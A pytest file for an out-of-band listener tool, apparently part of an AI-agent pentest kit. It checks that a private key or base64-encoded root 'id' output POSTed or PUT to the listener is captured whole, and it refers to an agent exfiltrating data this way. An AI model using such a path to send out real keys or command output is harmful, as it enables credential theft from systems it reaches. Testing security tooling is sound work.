"""OOB listener — whole-file exfil via the request body (not just URL-path)."""
import socket
import urllib.request

import tools.oob_listener as oob


def _free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def _post(port: int, data: bytes, method: str = "POST"):
    req = urllib.request.Request(f"http://127.0.0.1:{port}/", data=data, method=method)
    urllib.request.urlopen(req, timeout=5).read()


def test_posted_body_captured_whole(monkeypatch):
    # The fix: a key/file too big for a URL is POSTed in the body and comes back
    # WHOLE under 'bodies' — the agent's "offload it another way" path actually works.
    monkeypatch.setattr(oob, "_get_interface_ip", lambda iface: "127.0.0.1")
    port = _free_port()
    try:
        assert oob.oob_listener("start", interface="eth0", port=port)["status"] == "listening"
        key = "-----BEGIN PRIVATE KEY-----\n" + ("A" * 4000) + "\n-----END PRIVATE KEY-----\n"
        _post(port, key.encode())
        chk = oob.oob_listener("check")
        assert chk["callback_fired"] and chk["count"] == 1
        assert any("BEGIN PRIVATE KEY" in b and b.count("A") >= 4000 for b in chk["bodies"])
    finally:
        oob.oob_listener("stop")


def test_base64_body_decoded(monkeypatch):
    import base64
    monkeypatch.setattr(oob, "_get_interface_ip", lambda iface: "127.0.0.1")
    port = _free_port()
    try:
        oob.oob_listener("start", interface="eth0", port=port)
        secret = "uid=0(root) gid=0(root)\n" * 50
        _post(port, base64.b64encode(secret.encode()), method="PUT")   # PUT also works
        chk = oob.oob_listener("check")
        assert any("uid=0(root)" in b for b in chk["bodies"])           # decoded, not raw b64
    finally:
        oob.oob_listener("stop")
